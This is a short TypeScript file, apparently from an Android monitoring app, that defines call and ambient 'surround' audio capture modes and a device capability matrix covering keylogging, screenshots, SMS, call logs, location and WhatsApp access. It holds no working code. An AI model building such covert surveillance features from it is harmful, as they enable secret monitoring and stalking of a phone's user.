export enum AudioCaptureMode {
  TWO_WAY_HARDWARE = 'two_way_hardware', // Direct 2-way call stream recording
  MIC_FALLBACK = 'mic_fallback',          // Mic capture during active call
  SURROUND_ONLY = 'surround_only',        // Ambient surround recording
  UNSUPPORTED = 'unsupported',
}

export interface DeviceCapabilityMatrix {
  deviceId: string;
  androidVersion: number;
  sdkInt: number;
  manufacturer: string;
  model: string;
  capabilities: {
    location: boolean;
    callLogs: boolean;
    sms: boolean;
    contacts: boolean;
    appUsage: boolean;
    keylogger: boolean;
    screenshots: boolean;
    audioCaptureMode: AudioCaptureMode;
    whatsappNotifications: boolean;
    whatsappAccessibility: boolean;
    whatsappMedia: boolean;
    deviceOwnerMode: boolean;
  };
  lastUpdated: string;
}
